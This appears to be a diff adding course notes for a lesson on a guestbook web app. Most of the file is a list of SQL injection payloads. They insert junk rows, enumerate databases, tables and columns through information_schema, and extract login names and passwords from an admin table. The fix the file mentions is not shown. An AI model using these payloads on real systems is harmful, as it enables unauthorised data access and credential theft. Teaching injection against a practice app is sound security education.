@@ -1,0 +1,24 @@
+==================================================
+Part 5 Objectives
+==================================================
+
+- SQL injection attacks! (use code from Part 4)
+- A working fix (use code from Part 5)
+
+
+
+//SQL INJECTION
+//this attack puts a bunch of empty rows into the guestbook to annoy the admin
+'),('','',''),('','',''),('','',''),('','',''),('','',''),('','','') -- 
+
+//this attack lists all the databases on the server
+'), ('','',(SELECT group_concat(x.woot separator ', ') FROM (SELECT DISTINCT(table_schema) AS woot FROM information_schema.tables) x)) -- 
+
+//this attack lists all the tables in the guestbook_app database!
+'), ('','',(SELECT group_concat(table_name separator ', ') FROM information_schema.tables WHERE table_schema = 'guestbook_app')) -- 
+
+//this attack lists all the columns in the admininfo table
+'), ('','',(SELECT group_concat(column_name separator ', ') FROM information_schema.columns WHERE table_schema = 'guestbook_app' AND table_name = 'admininfo')) -- 
+
+//this attack lists all the important data in the admininfo table!
+'), ('','',(SELECT group_concat(login_name,': ',password separator '<br/>') FROM guestbook_app.admininfo)) -- 
